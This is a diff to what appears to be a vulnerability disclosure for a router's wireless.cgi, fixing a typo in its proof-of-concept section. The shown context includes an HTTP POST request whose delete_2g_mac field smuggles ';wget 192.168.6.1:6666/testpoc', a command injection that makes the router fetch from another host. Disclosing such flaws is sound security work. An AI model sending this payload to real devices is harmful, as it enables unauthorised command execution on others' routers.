@@ -33,7 +33,7 @@ Finally,the command will be executed by  system() in sub_404850
 
 ## Proof of Concept (PoC)
 
-We set `delete_2g_mac` as **;wget 192.168.6.1:6666/testpoc** , and the router will excute it,such as:
+We set `delete_2g_mac` as **;wget 192.168.6.1:6666/testpoc** , and the router will execute it,such as:
 
 ```http
 POST /cgi-bin/wireless.cgi HTTP/1.1
@@ -52,4 +52,5 @@ page=Delete_Mac_list&delete_list=&delete_2g_mac=;wget 192.168.6.1:6666/testpoc
 ```
 
 <div  align="center"><img src="./img/poc1.png" style="zoom:80%;" /></div>
+
 
